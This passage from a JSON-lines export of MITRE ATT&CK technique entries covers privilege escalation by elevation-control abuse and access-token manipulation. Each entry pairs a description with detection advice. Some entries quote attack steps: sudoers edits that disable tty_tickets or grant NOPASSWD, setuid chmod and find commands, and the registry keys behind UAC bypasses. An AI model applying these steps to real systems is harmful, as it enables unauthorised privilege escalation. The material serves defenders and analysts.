{"ID":"T1548","name":"Abuse Elevation Control Mechanism","description":"Adversaries may circumvent mechanisms designed to control elevate privileges to gain higher-level permissions. Most modern systems contain native elevation control mechanisms that are intended to limit privileges that a user can perform on a machine. Authorization has to be granted to specific users in order to perform tasks that can be considered of higher risk. An adversary can perform several methods to take advantage of built-in control mechanisms in order to escalate privileges on a system.","url":"https://attack.mitre.org/techniques/T1548","created":"30 January 2020","last modified":"21 April 2023","version":"1.1","tactics":"Defense Evasion, Privilege Escalation","detection":"Monitor the file system for files that have the setuid or setgid bits set. Also look for any process API calls for behavior that may be indicative of [Process Injection](https://attack.mitre.org/techniques/T1055) and unusual loaded DLLs through [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1574/001), which indicate attempts to gain access to higher privileged processes. On Linux, auditd can alert every time a user's actual ID and effective ID are different (this is what happens when you sudo).\n\nConsider monitoring for <code>/usr/libexec/security_authtrampoline</code> executions which may indicate that AuthorizationExecuteWithPrivileges is being executed. MacOS system logs may also indicate when AuthorizationExecuteWithPrivileges is being called. Monitoring OS API callbacks for the execution can also be a way to detect this behavior but requires specialized security tooling.\n\nOn Linux, auditd can alert every time a user's actual ID and effective ID are different (this is what happens when you sudo). This technique is abusing normal functionality in macOS and Linux systems, but sudo has the ability to log all input and output based on the <code>LOG_INPUT</code> and <code>LOG_OUTPUT</code> directives in the <code>/etc/sudoers</code> file.\n\nThere are many ways to perform UAC bypasses when a user is in the local administrator group on a system, so it may be difficult to target detection on all variations. Efforts should likely be placed on mitigation and collecting enough information on process launches and actions that could be performed before and after a UAC bypass is performed. Some UAC bypass methods rely on modifying specific, user-accessible Registry settings. Analysts should monitor Registry settings for unauthorized changes.","platforms":"Linux, Windows, macOS","data sources":"Command: Command Execution, File: File Metadata, File: File Modification, Process: OS API Execution, Process: Process Creation, Process: Process Metadata, Windows Registry: Windows Registry Key Modification","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":null,"permissions required":"Administrator, User","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":",(Citation: Github UACMe)"}
{"ID":"T1548.002","name":"Abuse Elevation Control Mechanism: Bypass User Account Control","description":"Adversaries may bypass UAC mechanisms to elevate process privileges on system. Windows User Account Control (UAC) allows a program to elevate its privileges (tracked as integrity levels ranging from low to high) to perform a task under administrator-level permissions, possibly by prompting the user for confirmation. The impact to the user ranges from denying the operation under high enforcement to allowing the user to perform the action if they are in the local administrators group and click through the prompt or allowing them to enter an administrator password to complete the action.(Citation: TechNet How UAC Works)\n\nIf the UAC protection level of a computer is set to anything but the highest level, certain Windows programs can elevate privileges or execute some elevated [Component Object Model](https://attack.mitre.org/techniques/T1559/001) objects without prompting the user through the UAC notification box.(Citation: TechNet Inside UAC)(Citation: MSDN COM Elevation) An example of this is use of [Rundll32](https://attack.mitre.org/techniques/T1218/011) to load a specifically crafted DLL which loads an auto-elevated [Component Object Model](https://attack.mitre.org/techniques/T1559/001) object and performs a file operation in a protected directory which would typically require elevated access. Malicious software may also be injected into a trusted process to gain elevated privileges without prompting a user.(Citation: Davidson Windows)\n\nMany methods have been discovered to bypass UAC. The Github readme page for UACME contains an extensive list of methods(Citation: Github UACMe) that have been discovered and implemented, but may not be a comprehensive list of bypasses. Additional bypass methods are regularly discovered and some used in the wild, such as:\n\n* <code>eventvwr.exe</code> can auto-elevate and execute a specified binary or script.(Citation: enigma0x3 Fileless UAC Bypass)(Citation: Fortinet Fareit)\n\nAnother bypass is possible through some lateral movement techniques if credentials for an account with administrator privileges are known, since UAC is a single system security mechanism, and the privilege or integrity of a process running on one system will be unknown on remote systems and default to high integrity.(Citation: SANS UAC Bypass)","url":"https://attack.mitre.org/techniques/T1548/002","created":"30 January 2020","last modified":"21 April 2023","version":"2.1","tactics":"Defense Evasion, Privilege Escalation","detection":"There are many ways to perform UAC bypasses when a user is in the local administrator group on a system, so it may be difficult to target detection on all variations. Efforts should likely be placed on mitigation and collecting enough information on process launches and actions that could be performed before and after a UAC bypass is performed. Monitor process API calls for behavior that may be indicative of [Process Injection](https://attack.mitre.org/techniques/T1055) and unusual loaded DLLs through [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1574/001), which indicate attempts to gain access to higher privileged processes.\n\nSome UAC bypass methods rely on modifying specific, user-accessible Registry settings. For example:\n\n* The <code>eventvwr.exe</code> bypass uses the <code>[HKEY_CURRENT_USER]\\Software\\Classes\\mscfile\\shell\\open\\command</code> Registry key.(Citation: enigma0x3 Fileless UAC Bypass)\n\n* The <code>sdclt.exe</code> bypass uses the <code>[HKEY_CURRENT_USER]\\Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\control.exe</code> and <code>[HKEY_CURRENT_USER]\\Software\\Classes\\exefile\\shell\\runas\\command\\isolatedCommand</code> Registry keys.(Citation: enigma0x3 sdclt app paths)(Citation: enigma0x3 sdclt bypass)\n\nAnalysts should monitor these Registry settings for unauthorized changes.","platforms":"Windows","data sources":"Command: Command Execution, Process: Process Creation, Process: Process Metadata, Windows Registry: Windows Registry Key Modification","is sub-technique":true,"sub-technique of":"T1548","defenses bypassed":"Windows User Account Control","contributors":"Casey Smith; Stefan Kanthak","permissions required":"Administrator, User","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":"Administrator","relationship citations":"(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ),(Citation: TrendMicro EarthLusca 2022),(Citation: Malwarebytes Konni Aug 2021),(Citation: Novetta Winnti April 2015),(Citation: Github UACMe),(Citation: Palo Alto Shamoon Nov 2016),(Citation: ESET Sednit Part 3),(Citation: Cybereason Bumblebee August 2022),(Citation: ESET PipeMon May 2020),(Citation: Talent-Jump Clambling February 2020),(Citation: Trend Micro DRBControl February 2020),(Citation: Fortinet Remcos Feb 2017),(Citation: Dell Sakula),(Citation: FOX-IT May 2016 Mofang),(Citation: ESET InvisiMole June 2020),(Citation: NCC Group WastedLocker June 2020),(Citation: McAfee Honeybee),(Citation: CISA AppleJeus Feb 2021),(Citation: Rancor Unit42 June 2018),(Citation: ESET InvisiMole June 2018),(Citation: Forcepoint Monsoon),(Citation: Mandiant No Easy Breach),(Citation: Antiy CERT Ramsay April 2020),(Citation: ESET Grandoreiro April 2020),(Citation: Uptycs Warzone UAC Bypass November 2020),(Citation: Cisco H1N1 Part 2),(Citation: Medium KONNI Jan 2020),(Citation: Microsoft BlackCat Jun 2022),(Citation: Secureworks BRONZE BUTLER Oct 2017),(Citation: F-Secure BlackEnergy 2014),(Citation: Check Point Warzone Feb 2020),(Citation: Trend Micro Tick November 2019),(Citation: Talos Lokibot Jan 2021),(Citation: MalwareBytes LazyScripter Feb 2021),(Citation: Github PowerShell Empire),(Citation: ClearSky MuddyWater Nov 2018),(Citation: GitHub PoshC2),(Citation: Arxiv Avaddon Feb 2021),(Citation: Github Koadic),(Citation: FinFisher Citation),(Citation: ESET RTM Feb 2017),(Citation: Proofpoint ZeroT Feb 2017),(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: Eset Ramsay May 2020),(Citation: Group IB Cobalt Aug 2017),(Citation: ESET Gelsemium June 2021),(Citation: Secure List Bad Rabbit),(Citation: Microsoft FinFisher March 2018),(Citation: ESET EvilNum July 2020),(Citation: cobaltstrike manual),(Citation: CISA AR18-352A Quasar RAT December 2018),(Citation: Securelist ScarCruft May 2019),(Citation: GitHub SILENTTRINITY Modules July 2019),(Citation: Nccgroup Emissary Panda May 2018),(Citation: Cymmetria Patchwork),(Citation: Crowdstrike Indrik November 2018),(Citation: GitHub Pupy),(Citation: Cybereason Kimsuky November 2020),(Citation: Github UACMe)"}
{"ID":"T1548.004","name":"Abuse Elevation Control Mechanism: Elevated Execution with Prompt","description":"Adversaries may leverage the <code>AuthorizationExecuteWithPrivileges</code> API to escalate privileges by prompting the user for credentials.(Citation: AppleDocs AuthorizationExecuteWithPrivileges) The purpose of this API is to give application developers an easy way to perform operations with root privileges, such as for application installation or updating. This API does not validate that the program requesting root privileges comes from a reputable source or has been maliciously modified. \n\nAlthough this API is deprecated, it still fully functions in the latest releases of macOS. When calling this API, the user will be prompted to enter their credentials but no checks on the origin or integrity of the program are made. The program calling the API may also load world writable files which can be modified to perform malicious behavior with elevated privileges.\n\nAdversaries may abuse <code>AuthorizationExecuteWithPrivileges</code> to obtain root privileges in order to install malicious software on victims and install persistence mechanisms.(Citation: Death by 1000 installers; it's all broken!)(Citation: Carbon Black Shlayer Feb 2019)(Citation: OSX Coldroot RAT) This technique may be combined with [Masquerading](https://attack.mitre.org/techniques/T1036) to trick the user into granting escalated privileges to malicious code.(Citation: Death by 1000 installers; it's all broken!)(Citation: Carbon Black Shlayer Feb 2019) This technique has also been shown to work by modifying legitimate programs present on the machine that make use of this API.(Citation: Death by 1000 installers; it's all broken!)","url":"https://attack.mitre.org/techniques/T1548/004","created":"30 January 2020","last modified":"19 October 2022","version":"1.0","tactics":"Defense Evasion, Privilege Escalation","detection":"Consider monitoring for <code>/usr/libexec/security_authtrampoline</code> executions which may indicate that <code>AuthorizationExecuteWithPrivileges</code> is being executed. MacOS system logs may also indicate when <code>AuthorizationExecuteWithPrivileges</code> is being called. Monitoring OS API callbacks for the execution can also be a way to detect this behavior but requires specialized security tooling.","platforms":"macOS","data sources":"Process: OS API Execution, Process: Process Creation","is sub-technique":true,"sub-technique of":"T1548","defenses bypassed":null,"contributors":"Erika Noerenberg, @gutterchurl, Carbon Black; Jimmy Astle, @AstleJimmy, Carbon Black","permissions required":"Administrator, User","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":"root","relationship citations":"(Citation: Carbon Black Shlayer Feb 2019),"}
{"ID":"T1548.001","name":"Abuse Elevation Control Mechanism: Setuid and Setgid","description":"An adversary may abuse configurations where an application has the setuid or setgid bits set in order to get code running in a different (and possibly more privileged) user’s context. On Linux or macOS, when the setuid or setgid bits are set for an application binary, the application will run with the privileges of the owning user or group respectively.(Citation: setuid man page) Normally an application is run in the current user’s context, regardless of which user or group owns the application. However, there are instances where programs need to be executed in an elevated context to function properly, but the user running them may not have the specific required privileges.\n\nInstead of creating an entry in the sudoers file, which must be done by root, any user can specify the setuid or setgid flag to be set for their own applications (i.e. [Linux and Mac File and Directory Permissions Modification](https://attack.mitre.org/techniques/T1222/002)). The <code>chmod</code> command can set these bits with bitmasking, <code>chmod 4777 [file]</code> or via shorthand naming, <code>chmod u+s [file]</code>. This will enable the setuid bit. To enable the setgid bit, <code>chmod 2775</code> and <code>chmod g+s</code> can be used.\n\nAdversaries can use this mechanism on their own malware to make sure they're able to execute in elevated contexts in the future.(Citation: OSX Keydnap malware) This abuse is often part of a \"shell escape\" or other actions to bypass an execution environment with restricted permissions.\n\nAlternatively, adversaries may choose to find and target vulnerable binaries with the setuid or setgid bits already enabled (i.e. [File and Directory Discovery](https://attack.mitre.org/techniques/T1083)). The setuid and setguid bits are indicated with an \"s\" instead of an \"x\" when viewing a file's attributes via <code>ls -l</code>. The <code>find</code> command can also be used to search for such files. For example, <code>find / -perm +4000 2>/dev/null</code> can be used to find files with setuid set and <code>find / -perm +2000 2>/dev/null</code> may be used for setgid. Binaries that have these bits set may then be abused by adversaries.(Citation: GTFOBins Suid)","url":"https://attack.mitre.org/techniques/T1548/001","created":"30 January 2020","last modified":"15 March 2023","version":"1.1","tactics":"Defense Evasion, Privilege Escalation","detection":"Monitor the file system for files that have the setuid or setgid bits set. Monitor for execution of utilities, like chmod, and their command-line arguments to look for setuid or setguid bits being set.","platforms":"Linux, macOS","data sources":"Command: Command Execution, File: File Metadata, File: File Modification","is sub-technique":true,"sub-technique of":"T1548","defenses bypassed":null,"contributors":null,"permissions required":"User","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: ANSSI Sandworm January 2021),(Citation: OSX Keydnap malware),"}
{"ID":"T1548.003","name":"Abuse Elevation Control Mechanism: Sudo and Sudo Caching","description":"Adversaries may perform sudo caching and/or use the sudoers file to elevate privileges. Adversaries may do this to execute commands as other users or spawn processes with higher privileges.\n\nWithin Linux and MacOS systems, sudo (sometimes referred to as \"superuser do\") allows users to perform commands from terminals with elevated privileges and to control who can perform these commands on the system. The <code>sudo</code> command \"allows a system administrator to delegate authority to give certain users (or groups of users) the ability to run some (or all) commands as root or another user while providing an audit trail of the commands and their arguments.\"(Citation: sudo man page 2018) Since sudo was made for the system administrator, it has some useful configuration features such as a <code>timestamp_timeout</code>, which is the amount of time in minutes between instances of <code>sudo</code> before it will re-prompt for a password. This is because <code>sudo</code> has the ability to cache credentials for a period of time. Sudo creates (or touches) a file at <code>/var/db/sudo</code> with a timestamp of when sudo was last run to determine this timeout. Additionally, there is a <code>tty_tickets</code> variable that treats each new tty (terminal session) in isolation. This means that, for example, the sudo timeout of one tty will not affect another tty (you will have to type the password again).\n\nThe sudoers file, <code>/etc/sudoers</code>, describes which users can run which commands and from which terminals. This also describes which commands users can run as other users or groups. This provides the principle of least privilege such that users are running in their lowest possible permissions for most of the time and only elevate to other users or permissions as needed, typically by prompting for a password. However, the sudoers file can also specify when to not prompt users for passwords with a line like <code>user1 ALL=(ALL) NOPASSWD: ALL</code>.(Citation: OSX.Dok Malware) Elevated privileges are required to edit this file though.\n\nAdversaries can also abuse poor configurations of these mechanisms to escalate privileges without needing the user's password. For example, <code>/var/db/sudo</code>'s timestamp can be monitored to see if it falls within the <code>timestamp_timeout</code> range. If it does, then malware can execute sudo commands without needing to supply the user's password. Additional, if <code>tty_tickets</code> is disabled, adversaries can do this from any tty for that user.\n\nIn the wild, malware has disabled <code>tty_tickets</code> to potentially make scripting easier by issuing <code>echo \\'Defaults !tty_tickets\\' >> /etc/sudoers</code>.(Citation: cybereason osx proton) In order for this change to be reflected, the malware also issued <code>killall Terminal</code>. As of macOS Sierra, the sudoers file has <code>tty_tickets</code> enabled by default.","url":"https://attack.mitre.org/techniques/T1548/003","created":"30 January 2020","last modified":"14 March 2022","version":"1.0","tactics":"Defense Evasion, Privilege Escalation","detection":"On Linux, auditd can alert every time a user's actual ID and effective ID are different (this is what happens when you sudo). This technique is abusing normal functionality in macOS and Linux systems, but sudo has the ability to log all input and output based on the <code>LOG_INPUT</code> and <code>LOG_OUTPUT</code> directives in the <code>/etc/sudoers</code> file.","platforms":"Linux, macOS","data sources":"Command: Command Execution, File: File Modification, Process: Process Creation, Process: Process Metadata","is sub-technique":true,"sub-technique of":"T1548","defenses bypassed":null,"contributors":null,"permissions required":"User","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":"root","relationship citations":"(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: objsee mac malware 2017),(Citation: hexed osx.dok analysis 2019),"}
{"ID":"T1134","name":"Access Token Manipulation","description":"Adversaries may modify access tokens to operate under a different user or system security context to perform actions and bypass access controls. Windows uses access tokens to determine the ownership of a running process. A user can manipulate access tokens to make a running process appear as though it is the child of a different process or belongs to someone other than the user that started the process. When this occurs, the process also takes on the security context associated with the new token.\n\nAn adversary can use built-in Windows API functions to copy access tokens from existing processes; this is known as token stealing. These token can then be applied to an existing process (i.e. [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001)) or used to spawn a new process (i.e. [Create Process with Token](https://attack.mitre.org/techniques/T1134/002)). An adversary must already be in a privileged user context (i.e. administrator) to steal a token. However, adversaries commonly use token stealing to elevate their security context from the administrator level to the SYSTEM level. An adversary can then use a token to authenticate to a remote system as the account for that token if the account has appropriate permissions on the remote system.(Citation: Pentestlab Token Manipulation)\n\nAny standard user can use the <code>runas</code> command, and the Windows API functions, to create impersonation tokens; it does not require access to an administrator account. There are also other mechanisms, such as Active Directory fields, that can be used to modify access tokens.","url":"https://attack.mitre.org/techniques/T1134","created":"14 December 2017","last modified":"30 March 2023","version":"2.0","tactics":"Defense Evasion, Privilege Escalation","detection":"If an adversary is using a standard command-line shell, analysts can detect token manipulation by auditing command-line activity. Specifically, analysts should look for use of the <code>runas</code> command. Detailed command-line logging is not enabled by default in Windows.(Citation: Microsoft Command-line Logging)\n\nIf an adversary is using a payload that calls the Windows token APIs directly, analysts can detect token manipulation only through careful analysis of user network activity, examination of running processes, and correlation with other endpoint and network behavior. \n\nThere are many Windows API calls a payload can take advantage of to manipulate access tokens (e.g., <code>LogonUser</code> (Citation: Microsoft LogonUser), <code>DuplicateTokenEx</code>(Citation: Microsoft DuplicateTokenEx), and <code>ImpersonateLoggedOnUser</code>(Citation: Microsoft ImpersonateLoggedOnUser)). Please see the referenced Windows API pages for more information.\n\nQuery systems for process and thread token information and look for inconsistencies such as user owns processes impersonating the local SYSTEM account.(Citation: BlackHat Atkinson Winchester Token Manipulation)\n\nLook for inconsistencies between the various fields that store PPID information, such as the EventHeader ProcessId from data collected via Event Tracing for Windows (ETW), Creator Process ID/Name from Windows event logs, and the ProcessID and ParentProcessID (which are also produced from ETW and other utilities such as Task Manager and Process Explorer). The ETW provided EventHeader ProcessId identifies the actual parent process.","platforms":"Windows","data sources":"Active Directory: Active Directory Object Modification, Command: Command Execution, Process: OS API Execution, Process: Process Creation, Process: Process Metadata, User Account: User Account Metadata","is sub-technique":false,"sub-technique of":null,"defenses bypassed":"Heuristic Detection, Host Forensic Analysis, System Access Controls, Windows User Account Control","contributors":"Jared Atkinson, @jaredcatkinson; Robby Winchester, @robwinchester3; Tom Ueltschi @c_APT_ure; Travis Smith, Tripwire","permissions required":"Administrator, User","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":"SYSTEM","relationship citations":"(Citation: Malwarebytes Kimsuky June 2021),(Citation: Symantec Hydraq Jan 2010),(Citation: CrowdStrike Ryuk January 2019),(Citation: McAfee Cuba April 2021),(Citation: Baumgartner Naikon 2015),(Citation: Trend Micro KillDisk 2),(Citation: Microsoft BlackCat Jun 2022),(Citation: Mandiant APT41),(Citation: PowerSploit Documentation),(Citation: FireEye FIN6 Apr 2019),(Citation: SentinelLabs Metador Technical Appendix Sept 2022),(Citation: GitHub PoshC2),(Citation: Github PowerShell Empire),(Citation: GitHub PowerSploit May 2012),(Citation: GitHub Sliver C2),(Citation: ESET Gelsemium June 2021),(Citation: IBM MegaCortex),(Citation: Sophos BlackCat Jul 2022),(Citation: Bishop Fox Sliver Framework August 2019),(Citation: Qualys Hermetic Wiper March 2022),(Citation: CrowdStrike SUNSPOT Implant January 2021),(Citation: Crowdstrike DriveSlayer February 2022),(Citation: Kaspersky Duqu 2.0),(Citation: RedCanary Mockingbird May 2020),(Citation: Microsoft runas),(Citation: Microsoft Create Token),(Citation: Microsoft Replace Process Token)"}
{"ID":"T1134.002","name":"Access Token Manipulation: Create Process with Token","description":"Adversaries may create a new process with an existing token to escalate privileges and bypass access controls. Processes can be created with the token and resulting security context of another user using features such as <code>CreateProcessWithTokenW</code> and <code>runas</code>.(Citation: Microsoft RunAs)\n\nCreating processes with a token not associated with the current user may require the credentials of the target user, specific privileges to impersonate that user, or access to the token to be used. For example, the token could be duplicated via [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001) or created via [Make and Impersonate Token](https://attack.mitre.org/techniques/T1134/003) before being used to create a process.\n\nWhile this technique is distinct from [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001), the techniques can be used in conjunction where a token is duplicated and then used to create a new process.","url":"https://attack.mitre.org/techniques/T1134/002","created":"18 February 2020","last modified":"11 April 2023","version":"1.2","tactics":"Defense Evasion, Privilege Escalation","detection":"If an adversary is using a standard command-line shell (i.e. [Windows Command Shell](https://attack.mitre.org/techniques/T1059/003)), analysts may detect token manipulation by auditing command-line activity. Specifically, analysts should look for use of the <code>runas</code> command or similar artifacts. Detailed command-line logging is not enabled by default in Windows.(Citation: Microsoft Command-line Logging)\n\nIf an adversary is using a payload that calls the Windows token APIs directly, analysts may detect token manipulation only through careful analysis of user activity, examination of running processes, and correlation with other endpoint and network behavior.\n\nAnalysts can also monitor for use of Windows APIs such as <code>CreateProcessWithTokenW</code> and correlate activity with other suspicious behavior to reduce false positives that may be due to normal benign use by users and administrators.","platforms":"Windows","data sources":"Command: Command Execution, Process: OS API Execution","is sub-technique":true,"sub-technique of":"T1134","defenses bypassed":"File system access controls, System access controls, Windows User Account Control","contributors":"Jonny Johnson; Vadim Khrykov","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: ESET Turla PowerShell May 2019),(Citation: McAfee Bankshot),(Citation: Novetta Blockbuster),(Citation: Malwarebytes Konni Aug 2021),(Citation: GitHub PoshC2),(Citation: Github PowerShell Empire),(Citation: Secureworks REvil September 2019),(Citation: Unit42 Azorult Nov 2018),(Citation: Talos ZxShell Oct 2014),(Citation: ESET PipeMon May 2020),(Citation: Novetta Blockbuster Tools),(Citation: Medium KONNI Jan 2020),(Citation: Cisco Ukraine Wipers January 2022),(Citation: CheckPoint Naikon May 2020),(Citation: Microsoft runas),(Citation: Microsoft Create Token),(Citation: Microsoft Replace Process Token)"}
{"ID":"T1134.003","name":"Access Token Manipulation: Make and Impersonate Token","description":"Adversaries may make new tokens and impersonate users to escalate privileges and bypass access controls. For example, if an adversary has a username and password but the user is not logged onto the system the adversary can then create a logon session for the user using the `LogonUser` function. The function will return a copy of the new session's access token and the adversary can use `SetThreadToken` to assign the token to a thread.\n\nThis behavior is distinct from [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001) in that this refers to creating a new user token instead of stealing or duplicating an existing one.","url":"https://attack.mitre.org/techniques/T1134/003","created":"18 February 2020","last modified":"11 April 2023","version":"1.1","tactics":"Defense Evasion, Privilege Escalation","detection":"If an adversary is using a standard command-line shell, analysts can detect token manipulation by auditing command-line activity. Specifically, analysts should look for use of the <code>runas</code> command. Detailed command-line logging is not enabled by default in Windows.(Citation: Microsoft Command-line Logging)\n\nIf an adversary is using a payload that calls the Windows token APIs directly, analysts can detect token manipulation only through careful analysis of user network activity, examination of running processes, and correlation with other endpoint and network behavior.\n\nAnalysts can also monitor for use of Windows APIs such as <code>LogonUser</code> and <code> SetThreadToken</code> and correlate activity with other suspicious behavior to reduce false positives that may be due to normal benign use by users and administrators.","platforms":"Windows","data sources":"Command: Command Execution, Process: OS API Execution","is sub-technique":true,"sub-technique of":"T1134","defenses bypassed":"File system access controls, System access controls, Windows User Account Control","contributors":"Jonny Johnson","permissions required":"Administrator, User","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":"SYSTEM","relationship citations":"(Citation: SentinelLabs Metador Technical Appendix Sept 2022),(Citation: cobaltstrike manual),(Citation: Microsoft runas),(Citation: Microsoft Create Token),(Citation: Microsoft Replace Process Token)"}
{"ID":"T1134.004","name":"Access Token Manipulation: Parent PID Spoofing","description":"Adversaries may spoof the parent process identifier (PPID) of a new process to evade process-monitoring defenses or to elevate privileges. New processes are typically spawned directly from their parent, or calling, process unless explicitly specified. One way of explicitly assigning the PPID of a new process is via the <code>CreateProcess</code> API call, which supports a parameter that defines the PPID to use.(Citation: DidierStevens SelectMyParent Nov 2009) This functionality is used by Windows features such as User Account Control (UAC) to correctly set the PPID after a requested elevated process is spawned by SYSTEM (typically via <code>svchost.exe</code> or <code>consent.exe</code>) rather than the current user context.(Citation: Microsoft UAC Nov 2018)\n\nAdversaries may abuse these mechanisms to evade defenses, such as those blocking processes spawning directly from Office documents, and analysis targeting unusual/potentially malicious parent-child process relationships, such as spoofing the PPID of [PowerShell](https://attack.mitre.org/techniques/T1059/001)/[Rundll32](https://attack.mitre.org/techniques/T1218/011) to be <code>explorer.exe</code> rather than an Office document delivered as part of [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001).(Citation: CounterCept PPID Spoofing Dec 2018) This spoofing could be executed via [Visual Basic](https://attack.mitre.org/techniques/T1059/005) within a malicious Office document or any code that can perform [Native API](https://attack.mitre.org/techniques/T1106).(Citation: CTD PPID Spoofing Macro Mar 2019)(Citation: CounterCept PPID Spoofing Dec 2018)\n\nExplicitly assigning the PPID may also enable elevated privileges given appropriate access rights to the parent process. For example, an adversary in a privileged user context (i.e. administrator) may spawn a new process and assign the parent as a process running as SYSTEM (such as <code>lsass.exe</code>), causing the new process to be elevated via the inherited access token.(Citation: XPNSec PPID Nov 2017)","url":"https://attack.mitre.org/techniques/T1134/004","created":"18 February 2020","last modified":"03 May 2022","version":"1.0","tactics":"Defense Evasion, Privilege Escalation","detection":"Look for inconsistencies between the various fields that store PPID information, such as the EventHeader ProcessId from data collected via Event Tracing for Windows (ETW), Creator Process ID/Name from Windows event logs, and the ProcessID and ParentProcessID (which are also produced from ETW and other utilities such as Task Manager and Process Explorer). The ETW provided EventHeader ProcessId identifies the actual parent process.(Citation: CounterCept PPID Spoofing Dec 2018)\n\nMonitor and analyze API calls to <code>CreateProcess</code>/<code>CreateProcessA</code>, specifically those from user/potentially malicious processes and with parameters explicitly assigning PPIDs (ex: the Process Creation Flags of 0x8XXX, indicating that the process is being created with extended startup information(Citation: Microsoft Process Creation Flags May 2018)). Malicious use of <code>CreateProcess</code>/<code>CreateProcessA</code> may also be proceeded by a call to <code>UpdateProcThreadAttribute</code>, which may be necessary to update process creation attributes.(Citation: Secuirtyinbits Ataware3 May 2019) This may generate false positives from normal UAC elevation behavior, so compare to a system baseline/understanding of normal system activity if possible.","platforms":"Windows","data sources":"Process: OS API Execution, Process: Process Creation, Process: Process Metadata","is sub-technique":true,"sub-technique of":"T1134","defenses bypassed":"Heuristic Detection, Host Forensic Analysis","contributors":"Wayne Silva, F-Secure Countercept","permissions required":"Administrator, User","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: CobaltStrike Daddy May 2017),(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: ESET PipeMon May 2020),(Citation: Malwarebytes Konni Aug 2021),"}
{"ID":"T1134.005","name":"Access Token Manipulation: SID-History Injection","description":"Adversaries may use SID-History Injection to escalate privileges and bypass access controls. The Windows security identifier (SID) is a unique value that identifies a user or group account. SIDs are used by Windows security in both security descriptors and access tokens. (Citation: Microsoft SID) An account can hold additional SIDs in the SID-History Active Directory attribute (Citation: Microsoft SID-History Attribute), allowing inter-operable account migration between domains (e.g., all values in SID-History are included in access tokens).\n\nWith Domain Administrator (or equivalent) rights, harvested or well-known SID values (Citation: Microsoft Well Known SIDs Jun 2017) may be inserted into SID-History to enable impersonation of arbitrary users/groups such as Enterprise Administrators. This manipulation may result in elevated access to local resources and/or access to otherwise inaccessible domains via lateral movement techniques such as [Remote Services](https://attack.mitre.org/techniques/T1021), [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002), or [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006).","url":"https://attack.mitre.org/techniques/T1134/005","created":"18 February 2020","last modified":"09 February 2021","version":"1.0","tactics":"Defense Evasion, Privilege Escalation","detection":"Examine data in user’s SID-History attributes using the PowerShell <code>Get-ADUser</code> cmdlet (Citation: Microsoft Get-ADUser), especially users who have SID-History values from the same domain. (Citation: AdSecurity SID History Sept 2015) Also monitor account management events on Domain Controllers for successful and failed changes to SID-History. (Citation: AdSecurity SID History Sept 2015) (Citation: Microsoft DsAddSidHistory)\n\nMonitor for Windows API calls to the <code>DsAddSidHistory</code> function. (Citation: Microsoft DsAddSidHistory)","platforms":"Windows","data sources":"Active Directory: Active Directory Object Modification, Process: OS API Execution, User Account: User Account Metadata","is sub-technique":true,"sub-technique of":"T1134","defenses bypassed":null,"contributors":"Alain Homewood, Insomnia Security; Vincent Le Toux","permissions required":"Administrator, SYSTEM","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Adsecurity Mimikatz Guide),(Citation: Github PowerShell Empire),(Citation: AdSecurity Kerberos GT Aug 2015),(Citation: Microsoft SID Filtering Quarantining Jan 2009),(Citation: AdSecurity Kerberos GT Aug 2015),(Citation: Microsoft Netdom Trust Sept 2012),(Citation: Microsoft Trust Considerations Nov 2014)"}
{"ID":"T1134.001","name":"Access Token Manipulation: Token Impersonation/Theft","description":"Adversaries may duplicate then impersonate another user's existing token to escalate privileges and bypass access controls. For example, an adversary can duplicate an existing token using `DuplicateToken` or `DuplicateTokenEx`. The token can then be used with `ImpersonateLoggedOnUser` to allow the calling thread to impersonate a logged on user's security context, or with `SetThreadToken` to assign the impersonated token to a thread.\n\nAn adversary may perform [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001) when they have a specific, existing process they want to assign the duplicated token to. For example, this may be useful for when the target user has a non-network logon session on the system.\n\nWhen an adversary would instead use a duplicated token to create a new process rather than attaching to an existing process, they can additionally [Create Process with Token](https://attack.mitre.org/techniques/T1134/002) using `CreateProcessWithTokenW` or `CreateProcessAsUserW`. [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001) is also distinct from [Make and Impersonate Token](https://attack.mitre.org/techniques/T1134/003) in that it refers to duplicating an existing token, rather than creating a new one.","url":"https://attack.mitre.org/techniques/T1134/001","created":"18 February 2020","last modified":"11 April 2023","version":"1.1","tactics":"Defense Evasion, Privilege Escalation","detection":"If an adversary is using a standard command-line shell, analysts can detect token manipulation by auditing command-line activity. Specifically, analysts should look for use of the <code>runas</code> command. Detailed command-line logging is not enabled by default in Windows.(Citation: Microsoft Command-line Logging)\n\nAnalysts can also monitor for use of Windows APIs such as <code>DuplicateToken(Ex)</code>, <code> ImpersonateLoggedOnUser </code>, and <code> SetThreadToken </code> and correlate activity with other suspicious behavior to reduce false positives that may be due to normal benign use by users and administrators.","platforms":"Windows","data sources":"Command: Command Execution, Process: OS API Execution","is sub-technique":true,"sub-technique of":"T1134","defenses bypassed":"File system access controls, System access controls, Windows User Account Control","contributors":"Jonny Johnson","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Microsoft FinFisher March 2018),(Citation: Tarrask scheduled task),(Citation: GitHub 